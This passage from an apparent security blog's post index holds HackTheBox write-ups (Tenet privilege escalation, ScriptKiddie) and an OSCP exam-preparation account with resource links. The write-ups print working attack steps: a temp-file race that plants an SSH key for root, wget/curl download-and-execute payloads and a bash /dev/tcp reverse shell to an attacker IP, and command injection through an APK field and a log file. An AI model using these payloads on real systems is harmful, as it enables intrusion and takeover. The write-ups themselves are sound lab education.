8      9                  /bin/echo \"Successfully added $sshName to authorized_keys file!\"     10     11          else     12     13                  /bin/echo \"Error in adding $sshName to authorized_keys file!\"     14     15          fi     16     17  }     18     19  checkFile() {     20     21          if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then     22     23                  /bin/echo \"Error in creating key file!\"     24     25                  if [[ -f $1 ]]; then /bin/rm $1; fi     26     27                  exit 1     28     29          fi     30     31  }     32     33  addKey() {     34     35          tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)     36     37          (umask 110; touch $tmpName)     38     39          /bin/echo $key &gt;&gt;$tmpName     40     41          checkFile $tmpName     42     43          /bin/cat $tmpName &gt;&gt;/root/.ssh/authorized_keys     44     45          /bin/rm $tmpName     46     47  }     48     49  key=\"ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu\"     50  addKey     51  checkAdded   Looking at the source code it was possible to detect a race condition vulnerability in the addKey() function caused by the insecure temporary save of the future content of root‚Äôs authorized_key. This issue allowed to poison the temp file and inject inside the root‚Äôs authorized_keys a custom value, allowing to get a high privileged access to the machine.  PoC of the insecure temp files (word writable file): neil@tenet:/tmp$ while true; do ls -al /tmp/ssh* 2&gt;/dev/null; done &amp; [1] 17432 neil@tenet:/tmp$ sudo /usr/local/bin/enableSSH.sh -rw-rw-rw- 1 root root 393 May  8 11:52 /tmp/ssh-ZivT3CmF   Created a loop that poisons the temp file with a custom ssh public key: neil@tenet:/tmp$ while true; do for i in $(ls /tmp/ssh* 2&gt;/dev/null); do echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAtXPtZN+kJ7TjgTIBnQdDQz9S/i417/k+SFrAl8vsUaBpgZrMQ3C6hFUnlLCYx4XTlE3ux/ucakxudjc/0PTjnYJBvUVWqzrrkHyOQ9a4jql3f3VdQjQojYu9QuF7gw2upR10f8vfBK5150AcvlG9Guo/bpiILQBHmVyBz3/0q/CJaiklBoWtfqGUvpCRYMi0A6SlW3ivmPMHqpJOmjw45U+NRCJMt9FwR/MvbpCxafLT2NjNId7sAySYY+zSJsmtKGz5jpLYrgOUUqrT03eRVivn5FcOlRY0SeRZe9q04DPw39PsjnHuzRioz49FnLb/J6HCpEx0BGM3vVhDoMTtWPmRVbKJbZw84RigagcAYnjL9uEhuzjAIqFpH+0HBetQ1ZXGlGQNwAR8FC+bZcnulQWUC5ceYtszHsrjNSwaDBL675thz5TtygxVVov12PyPQCONX5Xep3Ylxj53lNYlVKUbfiMGI3kXxmcsocXubHI7Au+q9FKq8XIoZadangM=' &gt; $i; done; done &amp; [1] 28754   Ran the script a couple of times in order to be sure to overwrite the key: neil@tenet:/tmp$ sudo /usr/local/bin/enableSSH.sh Successfully added root@ubuntu to authorized_keys file! neil@tenet:/tmp$ neil@tenet:/tmp$ sudo /usr/local/bin/enableSSH.sh Successfully added root@ubuntu to authorized_keys file! neil@tenet:/tmp$ sudo /usr/local/bin/enableSSH.sh Successfully added root@ubuntu to authorized_keys file! neil@tenet:/tmp$ sudo /usr/local/bin/enableSSH.sh Successfully added root@ubuntu to authorized_keys file! neil@tenet:/tmp$ ls pspy64 ssh-gEr8Rial ssh-NIjuZPmj systemd-private-3417bcfcc60f4260a884e8b9ab6b2234-apache2.service-jp1S5z systemd-private-3417bcfcc60f4260a884e8b9ab6b2234-systemd-resolved.service-FUiyZO systemd-private-3417bcfcc60f4260a884e8b9ab6b2234-systemd-timesyncd.service-xDGTr1 tmux-1001 vmware-root_982-2965972296   Logged in using the custom ssh key: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Tenet] ‚îî‚îÄ$ sudo ssh root@tenet.htb -i /home/pwn/.ssh/id_rsa Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)   * Documentation:  https://help.ubuntu.com  * Management:     https://landscape.canonical.com  * Support:        https://ubuntu.com/advantage    System information as of Sat May  8 12:14:32 UTC 2021    System load:  1.11               Processes:             189   Usage of /:   15.5% of 22.51GB   Users logged in:       1   Memory usage: 19%                IP address for ens160: 10.10.10.223   Swap usage:   0%    * Canonical Livepatch is available for installation.    - Reduce system reboots and improve kernel security. Activate at:      https://ubuntu.com/livepatch  53 packages can be updated. 31 of these updates are security updates. To see these additional updates run: apt list --upgradable  Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings   Last login: Thu Feb 11 14:37:46 2021 root@tenet:~# whoami &amp;&amp; hostname &amp;&amp; cat /root/root.txt &amp;&amp; ifconfig root tenet 04fd5a870b622aa491f031f6fe80f662 ens160: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500         inet 10.10.10.223  netmask 255.255.255.0  broadcast 10.10.10.255         inet6 fe80::250:56ff:feb9:c415  prefixlen 64  scopeid 0x20&lt;link&gt;         inet6 dead:beef::250:56ff:feb9:c415  prefixlen 64  scopeid 0x0&lt;global&gt;         ether 00:50:56:b9:c4:15  txqueuelen 1000  (Ethernet)         RX packets 772376  bytes 120290915 (120.2 MB)         RX errors 0  dropped 366  overruns 0  frame 0         TX packets 796895  bytes 315607462 (315.6 MB)         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0  lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536         inet 127.0.0.1  netmask 255.0.0.0         inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;         loop  txqueuelen 1000  (Local Loopback)         RX packets 192113  bytes 13793013 (13.7 MB)         RX errors 0  dropped 0  overruns 0  frame 0         TX packets 192113  bytes 13793013 (13.7 MB)         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0     Trophy In a parallel worlds theory, we can't know the relationship between consciousness and multiple realities. Does your head hurt yet ? Try to get some sleep. - Neil   Video"
  },
  
  {
    "title": "HackTheBox - ScriptKiddie",
    "url": "/posts/scriptkiddie/",
    "categories": "Articles & Writeups, HackTheBox",
    "tags": "hackthebox",
    "date": "2021-06-05 00:00:00 +0200",
    "content": "Introduction ScriptKiddie is an easy difficulty Linux box based on known vulnerabilities for traditional hacking tools. The target machine ran a custom web application that interacted with different tools, one of which vulnerable to APK template command injection. Exploiting the issue it was possible to obtain a reverse shell and get a foothold on the target. Local enumeration allowed to find a custom script ran with user privileges, also vulnerable to command injection, which provided user access to the box. pwn was allowed to execute msfconsole with high privileges using sudo, allowing to spawn a high privileged shell  Improved skills:    Command Injection Attacks   Code review   Used tools:    nmap   netcat     Enumeration Scanned all tcp ports: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/ScriptKiddie] ‚îî‚îÄ$ sudo nmap 10.10.10.226 -oN scans/all-ports.txt -sS -p- -v ... PORT     STATE SERVICE 22/tcp   open  ssh 5000/tcp open  http   Enumerated all open ports: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/ScriptKiddie] ‚îî‚îÄ$ sudo nmap 10.10.10.226 -oN scans/open-ports.txt -sT -sC -sV -Pn -p22,5000 ... PORT     STATE SERVICE VERSION 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA) |   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA) |_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519) 5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5) |_http-title: k1d'5 h4ck3r t00l5 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.33 seconds   Nmap discovered two services running on the target: an ssh service on port 22 revealing the exact build version of openssh and a python web server running on a non traditional port.    It was searched for known exploit targeting Werkzeug:  However for the current target the debug shell was not enabled.  Current web application features depended on different external tools (nmap, msfvenom and searchsploit), one of which vulnerable to APK template command injection.   Foothold The version of msfvenom used by the web application was vulnerable to APK template command injection (CVE-2020-7384). Metasploit msfvenom framework handles APK files in a way that allows for a malicious user to craft and publish a file that would execute arbitrary commands on a victim‚Äôs machine.  Because the web site allowed to upload different files used as template by msfvenom, this was a solid path to follow (since no msfvenom version was obtained earlier).  The PoC used to craft the malicious APK was the following: https://www.exploit-db.com/exploits/49491  The payload was then changed to download and execute a reverse shell on the victim machine: ... # Change me payload = 'wget -O - 10.10.14.14/revshell.sh | bash' ...   This was the second stage payload downloaded and executed by the initial one: bash -i &gt;&amp; /dev/tcp/10.10.14.14/443 0&gt;&amp;1   The malicious apk file was generated and the second stage payload was hosted using python http server: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/ScriptKiddie/exploit] ‚îî‚îÄ$ python3 49491.py [+] Manufacturing evil apkfile Payload: wget -O - 10.10.14.14/revshell.sh | bash -dname: CN='|echo d2dldCAtTyAtIDEwLjEwLjE0LjE0L3JldnNoZWxsLnNoIHwgYmFzaA== | base64 -d | sh #    adding: empty (stored 0%) Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true jar signed.  Warning: The signer's certificate is self-signed. The SHA1 algorithm specified for the -digestalg option is considered a security risk. This algorithm will be disabled in a future update. The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk. This algorithm will be disabled in a future update. POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.  [+] Done! apkfile is at /tmp/tmps70hg8mz/evil.apk Do: msfvenom -x /tmp/tmps70hg8mz/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/ScriptKiddie/exploit] ‚îî‚îÄ$ sudo python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...   Uploaded the malicious apk to the application and obtained a reverse shell:   ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/ScriptKiddie/exploit] ‚îî‚îÄ$ sudo nc -nlvp 443                                                         [sudo] password for kali: listening on [any] 443 ... connect to [10.10.14.14] from (UNKNOWN) [10.10.10.226] 56612 bash: cannot set terminal process group (895): Inappropriate ioctl for device bash: no job control in this shell kid@scriptkiddie:~/html$ whoami whoami kid kid@scriptkiddie:~/html$ hostname hostname scriptkiddie kid@scriptkiddie:~/html$ python3 -c 'import pty; pty.spawn(\"/bin/bash\")' python3 -c 'import pty; pty.spawn(\"/bin/bash\")' kid@scriptkiddie:~/html$ ^Z zsh: suspended  sudo nc -nlvp 443  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/ScriptKiddie/exploit] ‚îî‚îÄ$ stty raw -echo; fg [1]  + continued  sudo nc -nlvp 443  kid@scriptkiddie:~/html$ export TERM=xterm kid@scriptkiddie:~/html$ stty rows 60 columns 235   Lateral Movement to pwn Observing the running processes and local enumerating the box it was possible to discover a bash script vulnerable to code injection ran by the pwn user: kid@scriptkiddie:~/html$ cat /etc/passwd root:x:0:0:root:/root:/bin/bash ... kid:x:1000:1000:kid:/home/kid:/bin/bash pwn:x:1001:1001::/home/pwn:/bin/bash  kid@scriptkiddie:/var/www$ id uid=1000(kid) gid=1000(kid) groups=1000(kid) 2021/04/21 12:51:12 CMD: UID=1001 PID=64051  | /bin/bash /home/pwn/scanlosers.sh 2021/04/21 12:51:12 CMD: UID=1001 PID=64055  | 2021/04/21 12:51:12 CMD: UID=1001 PID=64054  | 2021/04/21 12:51:12 CMD: UID=1001 PID=64059  | /bin/bash /home/pwn/scanlosers.sh 2021/04/21 12:51:12 CMD: UID=1001 PID=64058  | /bin/bash /home/pwn/scanlosers.sh 2021/04/21 12:51:12 CMD: UID=1001 PID=64057  | nmap --top-ports 10 -oN recon/10.10.14.14.nmap 10.10.14.14 2021/04/21 12:51:12 CMD: UID=1001 PID=64056  | sh -c nmap --top-ports 10 -oN recon/10.10.14.14.nmap 10.10.14.14 2&gt;&amp;1 &gt;/dev/null 2021/04/21 12:51:13 CMD: UID=1001 PID=64064  | /bin/bash /home/pwn/scanlosers.sh 2021/04/21 12:51:13 CMD: UID=1001 PID=64063  | /bin/bash /home/pwn/scanlosers.sh 2021/04/21 12:51:13 CMD: UID=1001 PID=64062  | /bin/bash /home/pwn/scanlosers.sh 2021/04/21 12:51:13 CMD: UID=1001 PID=64061  | /bin/bash /home/pwn/scanlosers.sh 2021/04/21 12:51:13 CMD: UID=1001 PID=64060  | /bin/bash /home/pwn/scanlosers.sh 2021/04/21 12:51:14 CMD: UID=0    PID=64067  | /usr/sbin/incrond 2021/04/21 12:52:01 CMD: UID=0    PID=64081  | /bin/sh -c find /home/kid/html/static/payloads/ -type f -mmin +5 -delete 2021/04/21 12:52:01 CMD: UID=0    PID=64080  | /usr/sbin/CRON -f ... 2021/04/21 12:56:57 CMD: UID=1001 PID=64210  | /bin/bash -c sed -i 's/open  /closed/g' \"/home/pwn/recon/10.10.14.14.nmap\"   The scanlosers.sh script ran every time a hack was detected. It read data from a writable log file owned by kid (current user) and used them to build an nmap command: #!/bin/bash  log=/home/kid/logs/hackers  cd /home/pwn/ cat $log | cut -d' ' -f3- | sort -u | while read ip; do     sh -c \"nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2&gt;&amp;1 &gt;/dev/null\" &amp; done  if [[ $(wc -l &lt; $log) -gt 0 ]]; then echo -n &gt; $log; fi   A ping command was injected inside the log file to verify the vulnerability: kid@scriptkiddie:~/logs$ echo '0 0 $(ping -c1 10.10.14.14)' &gt; hackers  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/box/ScriptKiddie/loot/pwn_script] ‚îî‚îÄ$ sudo tcpdump icmp -i tun0 [sudo] password for kali: tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes 12:20:06.879068 IP 10.10.10.226 &gt; 10.10.14.14: ICMP echo request, id 5, seq 1, length 64 12:20:06.879098 IP 10.10.14.14 &gt; 10.10.10.226: ICMP echo reply, id 5, seq 1, length 64 12:20:06.930982 IP 10.10.10.226 &gt; 10.10.14.14: ICMP echo request, id 6, seq 1, length 64 12:20:06.931030 IP 10.10.14.14 &gt; 10.10.10.226: ICMP echo reply, id 6, seq 1, length 64   Proved that it was possible to execute code, a two-stage reverse shell payload was then used.  Served the same reverse shell used during the foothold: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/ScriptKiddie/exploit] ‚îî‚îÄ$ sudo python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...   Injected the staged command within the log: kid@scriptkiddie:~/logs$ echo '0 0 $(curl 10.10.14.14/revshell.sh | bash )' &gt; hackers   Obtained the reverse shell: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/box/ScriptKiddie/loot/pwn_script] ‚îî‚îÄ$ sudo nc -nlvp 443 listening on [any] 443 ... connect to [10.10.14.14] from (UNKNOWN) [10.10.10.226] 56974 bash: cannot set terminal process group (856): Inappropriate ioctl for device bash: no job control in this shell pwn@scriptkiddie:~$ whoami whoami pwn pwn@scriptkiddie:~$   Privilege Escalation Enumerated sudo privileges of the pwn user: pwn@scriptkiddie:~$ sudo -l Matching Defaults entries for pwn on scriptkiddie:     env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  User pwn may run the following commands on scriptkiddie:     (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole   Because the pwn user was able to execute the msfconsole tool with high privileges and the tool itself offered a builtin function to spawn a shell, it was possible to leverage this feature to obtain a full interactive root shell: pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6.0.9/msfconsole -q msf6 &gt; bash [*] exec: bash  root@scriptkiddie:/home/pwn# whoami &amp;&amp; hostname &amp;&amp; cat /root/root.txt &amp;&amp; ifconfig -a root scriptkiddie db90201a61bd45b56fe74fb7a44253ee ens160: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500         inet 10.10.10.226  netmask 255.255.255.0  broadcast 10.10.10.255         inet6 fe80::250:56ff:feb9:a9c3  prefixlen 64  scopeid 0x20&lt;link&gt;         inet6 dead:beef::250:56ff:feb9:a9c3  prefixlen 64  scopeid 0x0&lt;global&gt;         ether 00:50:56:b9:a9:c3  txqueuelen 1000  (Ethernet)         RX packets 31355  bytes 6228551 (6.2 MB)         RX errors 0  dropped 59  overruns 0  frame 0         TX packets 20962  bytes 24340256 (24.3 MB)         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0  lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536         inet 127.0.0.1  netmask 255.0.0.0         inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;         loop  txqueuelen 1000  (Local Loopback)         RX packets 53480  bytes 3798372 (3.7 MB)         RX errors 0  dropped 0  overruns 0  frame 0         TX packets 53480  bytes 3798372 (3.7 MB)         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0     Trophy A hacker does for love what others would not do for money - Laura Creighton"
  },
  
  {
    "title": "My OSCP Journey",
    "url": "/posts/my-oscp-journey/",
    "categories": "Articles & Writeups, InfoSec Education",
    "tags": "offsec, hacking-courses, OSCP",
    "date": "2021-06-04 00:00:00 +0200",
    "content": "Italian article available here  Pre-course Backgrund and preparation When I enrolled in the PWK course, I had worked as a software developer for 2 years and had been working as a Penetration Tester for another 2 years.  Prior to OSCP I had not yet obtained any certification, the only course I had taken was the eLearnSecurity‚Äôs PTSv4, but without attempting the related eJPT certification.  Having been self-taught for about 4 years, playing HackTheBox from a while and now working in the industry from a couple of years, I already mastered the pre-requisites suggested by Offensive Security, so I decided to enroll.    PEN-200 Course and Lab I enrolled in the PEN-200 (PWK 2020) on the 15th of Jennuary 2021. The course then started on the 24th of Jenuary with 90 days of lab access.  Day 01-30 I spent the first month looking at the course material (850+ pdf pages and 17+ hours of video) and doing the exercises required to get the 5 bonus points during the exam. Although they were not difficult, the exercises were many and required a lot of time to be done correctly (to get the 5 bonus points the exercises must all be complete and correct), so I decided to start them from the first day.  While reading the pdf I also began structuring notes and cheatsheets to use during the exam so that I would have all the useful references and commands ready at hand.  Day 31-60 Finally after 30 days of exercises and notes writing I was able to start hacking some boxes. I decided to start the journey following the PWK Labs Learning Path and then proceed autonomously with the ‚Äúlow hanging fruits‚Äù.  In the meantime I took notes for each one of the machines penetrated and I wrote short writeups so that I would have an executive summary and a brief overview for each of them.  Day 61-90 During the last month of access to the lab I did the extra mile exercises and I hacked as many machines as possible, trying to maintain an average of 1 machine per day.  At the end of the lab time I finished with 64 hacked machines (out of a total of about 70), one domain controller completely compromised and access to all 3 internal networks.  Up to the day before the exam Between the end of the course and the final exam I decided to let a month pass in order to have the necessary time to review or extend any doubts or knowledge in addition to writing the report of the lab (a complete writeup of 10 machines with different attack vector + all pdf exercises) to totalize the 5 additional points.  In this month I have followed two Udemy courses focused on Windows Privilege Escalation (‚ÄúWindows Privilege Escalation for OSCP &amp; Beyond!‚Äù and ‚ÄúWindows Privilege Escalation for Beginners‚Äù) and I kept rooting as many machines as possible on HackTheBox (I already had a VIP subscription) inspired by the lists of OSCP like machines that can be found on the web.    During each penetration test I always kept taking notes and writing writeups, in order to keep my second brain always updated and organized.  I ended up with a total of 51 rooted machines on HTB:    Lame - 10.10.10.3    Legacy - 10.10.10.4    Devel - 10.10.10.5    Beep - 10.10.10.7    Optimum - 10.10.10.8    Bastard - 10.10.10.9    Arctic - 10.10.10.11    Grandpa - 10.10.10.14    Granny - 10.10.10.15    Blue - 10.10.10.40    Shocker - 10.10.10.56    Jeeves - 10.10.10.63    Bashed - 10.10.10.68    Chatterbox - 10.10.10.74    DevOops - 10.10.10.91    Bounty - 10.10.10.93    Jerry - 10.10.10.95    Active - 10.10.10.100    SecNotes - 10.10.10.97    Access - 10.10.10.98    Querier - 10.10.10.125    Netmon - 10.10.10.152    Bastion - 10.10.10.134    SwagShop - 10.10.10.140    Writeup - 10.10.10.138    Jarvis - 10.10.10.143    Networked - 10.10.10.146    Postman - 10.10.10.160    Traverxec - 10.10.10.165    Obscurity - 10.10.10.168    OpenAdmin - 10.10.10.171    Traceback - 10.10.10.181    Magic - 10.10.10.185    Admirer - 10.10.10.187    Cache - 10.10.10.188    Blunder - 10.10.10.191    Tabby - 10.10.10.194    Buff - 10.10.10.198    Ready - 10.10.10.220    Delivery - 10.10.10.222    Tenet - 10.10.10.223    ScriptKiddie - 10.10.10.226    Ophiuchi - 10.10.10.227    Spectra - 10.10.10.229    TheNotebook - 10.10.10.230    Armageddon - 10.10.10.233    Schooled - 10.10.10.234    Atom - 10.10.10.237    Love - 10.10.10.239    Pit - 10.10.10.241    Knife - 10.10.10.242    To retrain my Buffer Overflow skills I also executed some exercises from the TryHackMe module Buffer Overflow Prep - Practice stack based buffer overflows!.    Day before the exam The day before the exam I stayed completely away from the hacking world and everything related to the certification. I rested, I had company, I had fun and I tried to sleep as much as possible in preparation for the big day (sleep that actually lacked because of the pressure).    Exam Day one The exam started at 9am, the proctors were on point and I didn‚Äôt have any kind of problem with the VPN or accessing the platforms.  I started right away with the BOF machine (while the scans were running on the other machines) and after about 1 hour and 45 minutes (yes, it took me longer than it should have according to my schedule) I got the first 25 points without any great difficulty.  Afterwards, I decided to take a look at all the scans and tackle one of the two 20 points machines to take the pressure off. After about 3 hours I got the user and after other 45 minutes I got the full 20 points.  At that point I decided to go ahead with the second 20 points machine. After 2 hours and 30 minutes I got the user flag but from there I got stuck on the privilege escalation process for about 1 hour and 15 minutes so that I decided to try to approach an easy win 10 points machine to restore a mental balance.  The 10 points machine was really a peace of cake and it took me less than 30 minutes to root it.  After the 10 points machine I decided to try and tackle the last missing box before going back to try the privilege escalation on the second Medium machine. After about 2 hours and 30 minutes of intense enumeration I got the user and after other 45 minutes I got the root flag.  Sure to have totaled a good margin of points to pass the exam (‚âà90pt) I have decided to still try an hour of privilege escalation, however without success. In the remaining time of VPN access I double-checked all the notes, procedures, exploits and I took any missing screenshots.  Around 1:00 AM I went to rest for about 4 hours and at 5:00 AM I started writing the final report.  Day two The second day was all downhill. The report (which I had already structured in the previous days) was just a sequence of copying and pasting from the notes and a bit of research for vulnerability remediation, but nothing more than that. At 12:27 I had already finished checking the report and I had already submitted it.  Exam history 08:30 - Proctoring stuff 09:00 - Exam started 10:43 - 25 points Buffer Overflow box rooted 12:35 - Lunch break (30 mins) 13:34 - 20 points box (1) user shell obtained 14:14 - 20 points box (1) rooted 16:43 - 20 points box (2) user shell obtained 18:26 - 10 points box rooted 19:30 - Dinner break (30 mins) 21:06 - 25 points box user shell obtained 22:00 - 25 points box rooted 01:05 - Rest 05:00 - Breakfast 05:30 - Started writing the final report 12:27 - Submitted the final report    Certificate The day after the delivery of the Lab and Exam reports (01/06/2021 @ 13:12) I received the email confirming the achievement of the certification.      Overview My experience with this course and certification has been overall positive. Although I feel that the work required to obtain the 5 bonus points is excessively time-consuming (considering that access to the lab is activated from day 1 and that it is not possible to stop it) the experience in the lab was exceptional: 70 and more machines almost all different from each other, different Active Directories, different internal networks to reach, interdependencies between different machines. It was really fun!  PDF and videos are very well structured and clear, perhaps a little too redundant in the two versions (many times the videos merely repeated things seen in the pdf without further elaboration). Not a big deal anyway.  The exam was challenging but fun. Reporting was not an issue.  The key concepts for obtaining the certification are primarily three:    Try harder (or rather ‚Äúenuemreate harder‚Äù)!   Organize your notes and cheatsheet properly   Google is your best friend   If you can master these key concepts getting certified will be a breeze.    Useful resources OSCP general resources    Offensive Security official web site   awesome-oscp: A curated list of awesome OSCP resources   OSCP/Pen Testing Resources   OSCP Repo: A list of commands, scripts, resources, and more that I have gathered and attempted to consolidate for use as OSCP (and more) study material.   Working with Shells    Pimp My Shell: 5 Ways to Upgrade a Netcat Shell   Upgrading Simple Shells to Fully Interactive TTYs   Reverse Shell Cheat Sheet (by HighOn.Coffee)   Reverse Shell Cheat Sheet (by pentestmonkey)   Shell Upgrade Cheat Sheet (by mlcsec)   Offensive Msfvenom: from Generating Shellcode to Creating Trojans   Msfvenom payload generation   General purpose hacking resource    HackTricks: the place where to find every hacking trick/technique/researches and news.   ippsec: ippsec video search   PayloadsAllTheThings: A list of useful payloads and bypass for Web Application Security and Pentest/CTF   All About OSCP: find everything related to OSCP   OSCP preparation notes (by infosecsanyam)   Penetration Testing Tools Cheat Sheet (by HighOn.Coffee)   Penetration testing tools: A neat list of penetration testing (some red) tools with usage commands and examples for quick reference. Originally intended for OSCP students.   RTFM: A database of common, interesting or useful commands, in one handy referable form   Pentest-Cheatsheets (by Tib3rius)   Linux specific resources    pwk-cheatsheet/linux-template   Linux Snippets (by mlcsec)   Linux Commands Cheat Sheet (by HighOn.Coffee)   Post Exploitation &amp; PrivEsc    GTFOBins: a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.   9 Ways to Backdoor a Linux Box   Methodology    Privilege Escalation Checklist (by swisskyrepo)   Privilege Escalation Checklist (by HackTricks)   Privilege Escalation Checklist (by infosecsanyam)   Basic Linux Privilege Escalation (by g0tmi1k)   Cheatsheet    Basic Linux Privilege Escalation (by g0tmi1k)   PayloadsAllTheThings - Linux Privilege Escalation   HackTricks - Linux Privilege Escalation   Privilege Escalation Cheatsheet (by 0xsp)   Awesome Privilege Escalation: A curated list of awesome privilege escalation   Ignitetechnologies/Privilege-Escalation : aimed at the CTF Players and Beginners to help them understand the fundamentals of Privilege Escalation with examples.   Tools    Linux Local Enumeration Script: performs basic linux local enumeration, a first step in the local privilege escalation process.   LinPEAS: a script that search for possible paths to escalate privileges on Linux/Unix* hosts. The checks are explained on book.hacktricks.xyz   linux-smart-enumeration: Linux enumeration tool for pentesting and CTFs with verbosity levels   unix-privesc-check: Shell script to check for simple privilege escalation vectors on Unix systems   LinEnum:  Scripted Local Linux Enumeration &amp; Privilege Escalation Checks   LES (Linux Exploit Suggester): designed to assist in detecting security deficiencies for given Linux kernel/Linux-based machine.   crontab guru: The quick and simple editor for cron schedule expressions by Cronitor   Windows specific resources    pwk-cheatsheet/windows-template   Windows Snippets (by mlcsec)   Basics of windows from total-oscp-guide    yeyintminthuhtut/Awesome-Red-Teaming: List of Awesome Red Teaming Resources   Post Exploitation &amp; PrivEsc    LOLBAS: every binary, script, and library that can be used for Living Off The Land techniques.   Methodology    Local Windows Privilege Escalation Checklist (by HackTricks)   Windows Privilege Escalation Guide (by absolomb)   Windows Privilege Escalation Fundamentals (by FuzzySecurity)   Windows Privilege Escalation Checklists (by netbiosX)   Local Windows Privilege Escalation Checklist (by infosecsanyam)   Cheatsheet    PayloadsAllTheThings - Windows Privilege Escalation   HackTricks - Windows Local Privilege Escalation   Windows Privilege Escalation Guide (by absolomb)    emilyanncr/Windows-Post-Exploitation : Windows post-exploitation tools, resources, techniques and commands to use during post-exploitation phase of penetration test.   red-team-cheatsheet (by 0xsp)   Privilege Escalation Cheatsheet (by 0xsp)   Windows Privilege Escalation Fundamentals (by FuzzySecurity)   Awesome Privilege Escalation: A curated list of awesome privilege escalation   Tools    Seatbelt: a C# project that performs a number of security oriented host-survey ‚Äúsafety checks‚Äù relevant from both offensive and defensive security perspectives.   WindowsEnum:  A Powershell Privilege Escalation Enumeration Script.   winPEAS: WinPEAS is a script that search for possible paths to escalate privileges on Windows hosts. The checks are explained on book.hacktricks.xyz   PowerUp: a PowerShell tool to assist with local privilege escalation on Windows systems. It contains several methods to identify and abuse vulnerable services, as well as DLL hijacking opportunities, vulnerable registry settings, and escalation opportunities.   windows-privesc-check: Standalone Executable to Check for Simple Privilege Escalation Vectors on Windows Systems   Watson: Enumerate missing KBs and suggest exploits for useful Privilege Escalation vulnerabilities   Sherlock: PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities.   Windows Exploit Suggester - Next Generation: a tool based on the output of Windows‚Äô systeminfo utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities.   Windows Exploit Suggester: compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target.   GhostPack-Compiled Binaries: Compiled Binaries for Ghostpack (.NET v4.0)   Nishang: Nishang - Offensive PowerShell for red team, penetration testing and offensive security.   RottenPotatoNG: New version of RottenPotato as a C++ DLL and standalone C++ binary - no need for meterpreter or other tools.   Juicy Potato: A sugared version of RottenPotatoNG, with a bit of juice, i.e. another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\\SYSTEM.   UACME: Defeating Windows User Account Control"
  },
  
  {
    "title": "HackTheBox - Delivery",
    "url": "/posts/delivery/",
    "categories": "Articles & Writeups, HackTheBox",
    "tags": "hackthebox",
    "date": "2021-05-22 00:00:00 +0200",
